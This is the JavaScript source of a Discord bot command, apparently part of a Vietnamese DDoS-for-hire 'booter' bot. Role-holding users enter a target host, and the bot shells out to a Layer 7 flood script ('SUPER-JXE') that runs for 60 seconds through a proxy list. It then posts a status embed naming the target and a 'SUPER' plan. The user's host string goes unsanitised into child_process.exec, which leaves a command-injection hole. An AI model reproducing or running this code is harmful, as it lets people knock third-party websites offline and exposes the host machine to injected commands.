const {
    MessageEmbed
} = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var roleID4 = ayarlar['roleID4'];
var commandroom = ayarlar['commandroom'];
var img = ayarlar['img'];
var photovip3 = ayarlar['photovip3'];
var randomgif = photovip3[Math['floor']((Math['random']() * photovip3['length']))];
module['exports'] = {
    name: 'super',
    description: 'T\u1EA5n c\xF4ng trang Web ( Layer7 )',
    type: 'CHAT_INPUT',
    cooldown: 60,
    options: [{
        name: 'methods',
        description: 'Ph\u01B0\u01A1ng ph\xE1p t\u1EA5n c\xF4ng',
        required: true,
        type: 'STRING',
        choices: [{
            name: `${'SUPER-JXE'}`,
            value: `${'SUPER-JXE'}`,
            inline: true
        }]
    }, {
        name: 'host',
        description: '\u0110\u1ECBa ch\u1EC9 t\u1EA5n c\xF4ng',
        required: true,
        type: 'STRING'
    }],
    run: async(_0xf396x7, _0xf396x8) => {
        if (!_0xf396x8['member']['roles']['cache']['has'](roleID4)) {
            return _0xf396x8['reply']({
                embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 c\xF3 <@&'}${roleID4}${'> m\u1EDBi \u0111\u01B0\u1EE3c d\xF9ng l\u1EC7nh n\xE0y.'}`)['setFooter']({
                    text: '\xA9 gbao#3417|Trần Khánh Phương#8365'
                })['setTimestamp']()]
            })
        };
        const _0xf396x9 = _0xf396x8['options']['getString']('methods');
        const _0xf396xa = _0xf396x8['options']['getString']('host');
        if (_0xf396x9 === 'SUPER-JXE') {
            var _0xf396xb = _0xf396x9;
            var _0xf396xc = require('child_process')['exec'];
            _0xf396xc(`${'node methods/L7/'}${_0xf396xb}${'.js '}${_0xf396xa}${' 60 8 proxy.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${_0xf396xa}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Thời Gian:`**',
                value: `${' [ 60 gi\xE2y ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ SUPER ] '}`,
                inline: true
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: gbao#3417|Trần Khánh Phương#8365', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: Jubi#2010', img)['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
    }
}
